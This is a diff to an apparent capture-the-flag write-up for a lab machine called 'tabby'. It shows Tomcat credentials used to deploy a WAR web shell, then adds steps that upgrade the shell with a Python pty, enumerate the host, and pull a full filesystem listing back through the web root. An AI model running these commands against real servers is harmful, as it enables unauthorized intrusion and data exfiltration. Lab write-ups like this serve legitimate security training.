@@ -224,3 +224,20 @@ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://tabby:8080/manager/te
 curl -u 'tomcat':'$3cureP4s5w0rd123!' 'http://tabby:8080/shell/'
 
 ```
+
+```sh
+# in the shell:
+# this shell does not provide any feedback. let's upgrade it:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+id # tomcat, tomcat, tomcat
+uname -a # Linux tabby 5.4.0-31-generic #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64 [...]
+env
+pwd # /var/lib/tomcat9/webapps
+ls -alp # finally we can properly browse around!
+ls -alp webapps
+
+# let's exfiltrate some data we have generated ourselves:
+cd webapps/shell
+find / > filesystem 2>&1
+curl tabby:8080/shell/filesystem > filesystem
+```
